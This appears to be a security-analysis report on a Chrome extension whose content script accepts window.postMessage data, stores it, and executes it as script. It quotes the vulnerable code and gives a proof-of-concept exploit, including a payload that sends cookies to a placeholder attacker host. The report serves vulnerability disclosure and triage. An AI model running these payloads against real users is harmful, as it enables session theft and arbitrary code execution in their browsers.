# CoCo Analysis: cmadiiiggcaaelekacljabmbebfghaif

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cs_window_eventListener_message → chrome_storage_local_set_sink)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/cmadiiiggcaaelekacljabmbebfghaif/opgen_generated_files/cs_1.js
Line 684 - window.addEventListener('message', event => {
Line 685 - if ( event && event.data && event.data.findmanual )
Line 687 - let mKey = event.data.params.key;
Line 692 - msgData[mKey] = event.data.params.value;

**Code:**

```javascript
// Content script - Code execution helper (cs_1.js lines 667-676)
function addPrivSet(privSet)
{
    if(!document.body || !document.body.appendChild)
    {
        return setTimeout(addPrivSet, 100, privSet);
    }
    let s = document.createElement('script');
    s.appendChild(document.createTextNode(privSet)); // ← Creates script with data as code
    document.body.appendChild(s); // ← EXECUTES THE CODE
}

// Content script - postMessage listener (cs_1.js lines 684-707)
window.addEventListener('message', event => {
    if ( event && event.data && event.data.findmanual ) // ← attacker sets findmanual: true
    {
        let mKey = event.data.params.key; // ← attacker-controlled key
        switch(event.data.params.action)
        {
            case 'setData':
                let msgData = {};
                msgData[mKey] = event.data.params.value; // ← attacker-controlled value
                chrome.storage.local.set(msgData); // ← writes to storage
                break;
            case 'getData':
                chrome.storage.local.get(mKey, function(data) { // ← reads from storage
                    if(event.data.params.handler)
                    {
                        data[mKey] = event.data.params.handler+'('+JSON.stringify(data[mKey])+')'; // ← wraps in function call
                    }
                    addPrivSet(data[mKey]); // ← EXECUTES retrieved data as JavaScript
                });
                break;
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website - content script runs on `http://*/*`, `https://*/*`

**Attack Vector:** window.postMessage from any webpage

**Attack:**

```javascript
// ARBITRARY CODE EXECUTION ATTACK

// Stage 1: Write malicious JavaScript to storage
window.postMessage({
    findmanual: true,
    params: {
        action: 'setData',
        key: 'exploit',
        value: 'alert("XSS"); fetch("https://attacker.com/exfil?cookie=" + document.cookie);'
    }
}, '*');

// Stage 2: Retrieve and execute the malicious code
window.postMessage({
    findmanual: true,
    params: {
        action: 'getData',
        key: 'exploit'
        // handler optional - could use 'eval' to wrap in eval()
    }
}, '*');

// Alternative: Direct execution with handler
window.postMessage({
    findmanual: true,
    params: {
        action: 'setData',
        key: 'payload',
        value: '"malicious payload"'
    }
}, '*');

window.postMessage({
    findmanual: true,
    params: {
        action: 'getData',
        key: 'payload',
        handler: 'eval'  // Creates: eval("malicious payload")
    }
}, '*');

// One-shot attack: If data already in storage
window.postMessage({
    findmanual: true,
    params: {
        action: 'getData',
        key: 'any_existing_key'
    }
}, '*');
// Retrieved value is executed as code via addPrivSet()
```

**Impact:** CRITICAL - Arbitrary code execution on any website. This is the most severe vulnerability type:

1. **Persistent Code Execution**: Attacker writes malicious JavaScript to storage, then triggers execution by reading it back. The code executes in the page context with full DOM access.

2. **Immediate Code Execution**: Even without writing first, any existing storage data can be executed by using getData action.

3. **Full Compromise**: Attacker can:
   - Steal cookies, credentials, and session tokens from any website
   - Perform actions as the logged-in user (CSRF)
   - Modify page content and inject phishing forms
   - Keylog user input
   - Pivot to attack other websites when user navigates
   - Exfiltrate sensitive data to attacker-controlled servers

4. **Universal Attack Surface**: Works on ALL websites (`http://*/*`, `https://*/*`) where the content script runs.

The vulnerability combines storage write, storage read, and automatic code execution via `addPrivSet()` which creates script elements. This is a complete arbitrary code execution vulnerability.
